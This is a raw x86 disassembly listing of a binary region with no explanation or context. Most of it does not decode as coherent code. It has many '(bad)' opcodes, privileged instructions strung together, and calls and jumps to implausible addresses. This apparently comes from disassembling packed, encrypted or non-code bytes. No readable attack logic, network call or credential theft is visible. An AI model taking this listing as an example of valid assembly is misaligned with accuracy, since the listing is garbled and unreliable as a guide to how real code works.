  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
